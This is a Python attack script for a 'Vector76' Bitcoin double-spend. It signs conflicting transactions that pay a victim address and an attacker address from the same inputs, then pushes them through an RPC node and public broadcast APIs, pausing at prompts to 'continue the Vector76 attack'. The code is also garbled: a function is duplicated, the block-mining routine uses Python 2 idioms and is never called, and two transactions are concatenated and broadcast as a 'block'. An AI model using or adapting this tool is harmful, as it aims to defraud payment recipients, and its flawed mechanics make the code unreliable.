import time
import argparse
import bitcoincli.client
import requests
import subprocess

from bitcoin import *
from cryptos import *
from datetime import datetime
from hashlib import sha256
from bitcoinaddress import Wallet
import bitcoincli

testnet = True #Network Option

parser = argparse.ArgumentParser(description="How To Use vector76")
parser.add_argument("node_host",
                    help="Blockchain Node Host",
                    type=str)
parser.add_argument("node_port",
                    help="Blockchain Node Port",
                    type=int)
parser.add_argument("username",
                    help="public node username",
                    type=str)
parser.add_argument("password",
                    help="public node password",
                    type=str)

parser.add_argument("attacker_signkey",
                    help="The attacker has the WIF format private key of the first address (this is used to sign the transaction)",
                    type=str)
parser.add_argument("victim_address",
                    help="victim address.",
                    type=str)
parser.add_argument("attacker_address",
                    help="Address held by attacker to receive refund (Please prepare an address that is different from the address that can be generated with the private key specified in the first place.)",
                    type=str)
parser.add_argument("amount_of_coins",
                    help="Amount of coins sent. (Enter in BTC units)",
                    type=float)
parser.add_argument("last_UXTO",
                    help="Last UXTO of first attacker address",
                    type=str)

def to_satoshi(btc_amount):
    satoshi = 0.00000001
    return int(btc_amount / satoshi)

def broadcast_transaction(raw_tx, testnet):
    url = "https://blockchain.info/pushtx"
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    payload = {'tx': raw_tx}
    if testnet:
        url = "https://blockstream.info/testnet/api/tx"
        headers = {'Content-Type': 'text/plain'}
        payload = raw_tx

    response = requests.post(url, data=payload, headers=headers)
    print(response.text)
    if response.status_code == 200:
        print("Transaction successfully broadcasted!")
    else:
        print(f"Failed to broadcast transaction. Status code: {response.status_code}")

def get_block_header_by_txid(txid, network):
    # URL to get transaction information
    tx_url = f'https://api.blockcypher.com/v1/btc/{network}/txs/{txid}'
    
    # Request transaction information
    tx_response = requests.get(tx_url)
    if tx_response.status_code != 200:
        print(f"Error while retrieving transaction information: {tx_response.status_code}")
        return
    
    tx_data = tx_response.json()
    
    # Obtaining a block hash from transaction data
    block_hash = tx_data.get('block_hash')
    if not block_hash:
        print("Transaction not found in block.")
        return
    
    # URL to get block information
    block_url = f'https://api.blockcypher.com/v1/btc/{network}/blocks/{block_hash}'
    
    # Request information about a block
    block_response = requests.get(block_url)
    if block_response.status_code != 200:
        print(f"Error while retrieving block information: {block_response.status_code}")
        return
    
    block_data = block_response.json()
    
    # Getting Block Header
    block_header = {
        'Block': block_data.get('hash'),
        'Block Height': block_data.get('height'),
        'Mined Time': block_data.get('time'),
        'Prev Block': block_data.get('prev_block'),
        'Merkle Root': block_data.get('mrkl_root'),
        'Nonce': block_data.get('nonce'),
        'Bits': block_data.get('bits'),
        'Version': block_data.get('ver')
    }
    print(f"Block: {block_data.get('hash')}")
    print(f"Block Height: {block_data.get('height')}")
    print(f"Mined Time: {block_data.get('time')}")
    print(f"Prev Block :  {block_data.get('prev_block')}")
    print(f"Merkle Root : {block_data.get('mrkl_root')}")
    print(f"Nonce: {block_data.get('nonce')}")
    print(f"Bits: {block_data.get('bits')}")
    print(f"Version: {block_data.get('ver')}")
    return block_header



def mine_vector76_block(block_header_V, inject_tx):
    version_hex    = format(block_header_V["Version"], "08x")[::-1]
    #block_hex      = block_header_V["Block"][::-1]
    #height_hex = format(block_header_V["Block Heihgt"], "x")[::-1]
    prev_block_hex = block_header_V["Prev Block"][::-1]
    markle_root_hex = block_header_V["Merkle Root"][::-1]
    timestamp_s = int((datetime.strptime(block_header_V["Mined Time"], "%Y-%m-%d %H:%M:%S")-datetime(1970,1,1)).total_seconds())
    timestamp_hex = format(timestamp_s,"x")[::-1]
    bits_hex  = format(block_header_V["Bits"], "x")[::-1]
    nonce_hex = format(block_header_V["Nonce"], "x")[::-1]

    # 金融庁の資料によると、一つ目のトランザクションを含めてマイニンングするらしいが挿入する箇所はわかっていない。
    vector76_blockheader = f"{version_hex}{prev_block_hex}{markle_root_hex}{timestamp_hex}{bits_hex}{inject_tx}{nonce_hex}"
    block_hash = sha256(sha256(vector76_blockheader).digest()).digest()[::-1].encode("hex")
    print(f"Block Hash : {block_hash}")
    return block_hash

def get_block_header_by_txid(txid, network):
    # URL to get transaction information
    tx_url = f'https://api.blockcypher.com/v1/btc/{network}/txs/{txid}'
    
    # Request transaction information
    tx_response = requests.get(tx_url)
    if tx_response.status_code != 200:
        print(f"Error while retrieving transaction information: {tx_response.status_code}")
        return
    
    tx_data = tx_response.json()
    
    # Obtaining a block hash from transaction data
    block_hash = tx_data.get('block_hash')
    if not block_hash:
        print("Transaction not found in block.")
        return
    
    # URL to get block information
    block_url = f'https://api.blockcypher.com/v1/btc/{network}/blocks/{block_hash}'
    
    # Request information about a block
    block_response = requests.get(block_url)
    if block_response.status_code != 200:
        print(f"Error while retrieving block information: {block_response.status_code}")
        return
    
    block_data = block_response.json()
    
    # Getting Block Header
    block_header = {
        'Block': block_data.get('hash'),
        'Block Height': block_data.get('height'),
        'Mined Time': block_data.get('time'),
        'Prev Block': block_data.get('prev_block'),
        'Merkle Root': block_data.get('mrkl_root'),
        'Nonce': block_data.get('nonce'),
        'Bits': block_data.get('bits'),
        'Version': block_data.get('ver')
    }
    print(f"Block: {block_data.get('hash')}")
    print(f"Block Height: {block_data.get('height')}")
    print(f"Mined Time: {block_data.get('time')}")
    print(f"Prev Block :  {block_data.get('prev_block')}")
    print(f"Merkle Root : {block_data.get('mrkl_root')}")
    print(f"Nonce: {block_data.get('nonce')}")
    print(f"Bits: {block_data.get('bits')}")
    print(f"Version: {block_data.get('ver')}")
    return block_header

args = parser.parse_args()
rpc_host = args.node_host
rpc_port = args.node_port
username = args.username
password = args.password

key = args.attacker_signkey
victim_address   = args.victim_address
attacker_address = args.attacker_address
last_txid  = args.last_UXTO
amount_btc = args.amount_of_coins


fee = 15000
transaction_util = Bitcoin(testnet=testnet)
print("Connecting Public Node...")
rpc_node = bitcoincli.Bitcoin(rpchost=rpc_host,
                              rpcport=rpc_port,
                              rpcuser=username,
                              rpcpasswd=password)#(rpcuser=username, rpcpasswd=password, rpchost=rpc_host, rpcport=rpc_port)
print(rpc_node.getblockchaininfo())
print("OK")
#key   = transaction_util.encode_privkey(key, "wif")
send_amount = to_satoshi(amount_btc)
inputs = transaction_util.unspent(transaction_util.wiftoaddr(key))
print(inputs)
tx_victim = [{"address": victim_address, "value": send_amount}]
tx_victim = transaction_util.mktx_with_change(inputs, tx_victim, fee=fee)
tx_victim["outs"][0]["value"] = tx_victim["outs"][0]["value"]
print(tx_victim)
tx_victim = serialize(transaction_util.signall(tx_victim, key))
tx_attacker = [{"address": attacker_address, "value": send_amount}]
tx_attacker = transaction_util.mktx_with_change(inputs, tx_attacker, fee=fee)
tx_attacker["outs"][0]["value"] = tx_attacker["outs"][0]["value"]
tx_attacker = serialize(transaction_util.signall(tx_attacker, key))
print()
print()
tx_vector76 = f"{tx_attacker}{tx_victim}"
print("Mining Vector76 Block...")
rpc_node.sendrawtransaction(tx_vector76)
rpc_node.generateblock(f'"{attacker_address}",["{tx_vector76}"],false')
#result = rpc_node.sendrawtransaction(f"['{vector76_tx}']")
print("--------------------")
print(f"Victim      : {victim_address}")
print(f"Attacker    : {attacker_address}")
print(f"Send Amount (Satoshi unit)    : {send_amount} Satoshi")
print(f"Fee Amount  (Satoshi unit)    : {fee} Satoshi")
print(f"Signed V1 RawTx           : {tx_victim}")
print(f"Signed V2 RawTx           : {tx_attacker}")
print(f"Vector76  Block           : {tx_vector76}")
print("--------------------")
print()
print()
print("[+] READY...")
print()
input(" --- Press the enter key to continue the Vector76 attack... --- ")
#print(amount_satoshi)
print()
print("OK")
print("push V1 TX...")
broadcast_transaction(tx_victim, testnet)
#print()
input("--- Send the block after pressing the enter key. --- ")
print(f"Broadcast Vector76 Block...")
broadcast_transaction(tx_vector76, testnet)
#broadcast_transaction(tx_attacker, testnet)
#rpc_node.submitblock(f"'{tx_vector76}'")
#transaction_util.pushtx(vector76_tx)
#transaction_util.pushtx(vector76_block)
#vector76_block = rpc_node.submitblock(f'{vector76_tx}')
#miner = Wallet()
#print(miner)
#print(f"Submit Vector76 Block...   : {vector76_block}")
#print()
#result = rpc_node.submitblock(vector76_block)
#print(f"Vector76 rawtx: {vector76_tx}")
print()
#おまけ
print("Kamijou Touma >> Kill that blockchain transaction!! 👊 💥 ")
print()

sound_name = "ImagineBreaker.mp3"
try:
    import mp3play
    clip = mp3play.load(sound_name)
    clip.play()
    time.sleep(min(5, clip.seconds()))
    clip.stop()
except:
    # Termux Only
    imagine_breaker_cmd = ["cvlc", "--play-and-exit", sound_name]
    subprocess.run(imagine_breaker_cmd)

print("Done.")
